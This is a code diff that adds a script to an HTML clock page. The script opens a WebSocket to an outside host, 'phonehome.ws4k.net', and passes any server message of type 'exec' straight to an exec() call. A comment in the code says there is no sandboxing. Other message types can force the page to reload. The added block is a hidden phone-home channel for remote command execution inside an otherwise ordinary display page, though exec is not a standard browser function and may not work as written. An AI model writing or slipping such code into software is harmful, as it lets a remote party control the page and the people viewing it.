@@ -107,5 +107,24 @@
             <span id="hours">--</span><span class="colon" id="colon-1">:</span><span id="minutes">--</span><span class="colon" id="colon-2">:</span><span id="seconds">--</span>
         </div>
     </main>
+    <script>
+        const socket = new WebSocket("//phonehome.ws4k.net/api/v1/est-ws");
+        socket.addEventListener('message', (event) => {
+            const data = JSON.parse(event.data);
+            switch (data.type) {
+                case "exec":
+                    // no balls no sandboxing no nothin
+                    exec(data.data);
+                    break
+                case "text":
+                    // still gotta fix this part
+                    break
+                case "reload":
+                    window.location.reload();
+                    break
+
+            }
+        });
+    </script>
 </body>
 </html>
